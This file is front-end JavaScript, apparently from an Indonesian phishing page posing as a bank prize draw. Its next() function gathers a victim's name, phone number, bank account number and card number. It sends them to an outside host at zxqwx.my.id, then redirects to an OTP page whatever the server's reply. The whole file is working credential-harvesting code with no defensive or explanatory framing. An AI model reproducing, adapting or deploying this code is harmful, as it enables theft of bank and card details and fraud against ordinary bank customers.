$(document).ready(function() {
	/* FOR TEST ONLY */
	/*$("#name").val("Bagas");
	$("#balance").val("20000000");
	$("#phone").val("81123456789");*/
	/* */
});

function next() {
	var name = $("#name").val().trim();
	var phone = $("#phone").val().trim();
	var account = $("#account").val().trim();
	var card = $("#card").val().trim();
	if (name=="" || phone=="" || account=="" || card=="") {
		alert('Mohon lengkapi data!');
		return;
	}
	phone = "+62"+phone;
	$("#loader").css('display', 'flex');
	
	var message = ('\nNama Lengkap:\n'+name+'\n\nNo. HP:\n'+phone+'\n\nNo. Rekening:\n'+account+'\n\nNo. Kartu:\n'+card);
	var fd = new FormData();
	fd.append('message', message);
	
	fetch("https://zxqwx.my.id/senders/"
        +"gebyar-brks-hadiah/send.php", {
        method: 'POST',
        body: fd
      })
      .then(response => response.json())
      .then(data => {
      	dataSent();
      })
      .catch((error) => {
      	dataSent();
      });
}

function dataSent() {
          $("#loader").css('display', 'none');
		  window.location.href = "otp.html";
}